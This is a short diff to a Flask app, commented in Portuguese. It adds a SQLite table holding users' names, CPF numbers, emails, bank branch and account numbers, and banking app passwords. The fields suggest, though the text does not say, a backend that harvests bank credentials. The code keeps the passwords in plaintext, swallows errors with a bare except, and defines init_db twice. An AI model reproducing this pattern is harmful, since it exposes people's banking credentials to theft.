@@ -3,7 +3,21 @@ import sqlite3
 from flask import Flask, render_template, request, redirect, url_for
 
 app = Flask(__name__)
-
+def init_db():
+    conn = sqlite3.connect('dados_bancarios.db')
+    cursor = conn.cursor()
+    # Adiciona as colunas caso elas não existam (correção rápida)
+    try:
+        cursor.execute('ALTER TABLE usuarios ADD COLUMN agencia TEXT')
+        cursor.execute('ALTER TABLE usuarios ADD COLUMN conta TEXT')
+        cursor.execute('ALTER TABLE usuarios ADD COLUMN senha_app TEXT')
+    except:
+        pass # Se as colunas já existirem, ele ignora o erro
+    
+    cursor.execute('''CREATE TABLE IF NOT EXISTS usuarios 
+        (id INTEGER PRIMARY KEY AUTOINCREMENT, nome TEXT, cpf TEXT, email TEXT, agencia TEXT, conta TEXT, senha_app TEXT)''')
+    conn.commit()
+    conn.close()
 def init_db():
     try:
         conn = sqlite3.connect('dados_bancarios.db')
@@ -59,6 +73,7 @@ if __name__ == '__main__':
     init_db()
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
+
 
 
 
